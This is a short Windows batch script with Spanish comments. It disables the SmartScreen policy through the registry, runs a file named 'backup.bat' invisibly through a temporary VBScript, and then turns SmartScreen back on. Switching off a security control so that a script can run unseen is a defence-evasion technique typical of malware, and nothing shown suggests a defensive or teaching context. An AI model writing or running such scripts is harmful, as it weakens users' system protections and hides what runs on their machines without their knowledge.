@echo off
SetLocal

:: Deshabilitar SmartScreen
reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SmartScreen" /v "EnableSmartScreen" /t REG_SZ /d "0" /f

set VBSFile=%temp%\invisible.vbs
(
echo Set objShell = CreateObject("WScript.Shell"^)
echo objShell.Run "backup.bat", 0, False
)>%VBSFile%
cscript //nologo %VBSFile%

:: Habilitar SmartScreen nuevamente
reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SmartScreen" /v "EnableSmartScreen" /t REG_SZ /d "1" /f

EndLocal
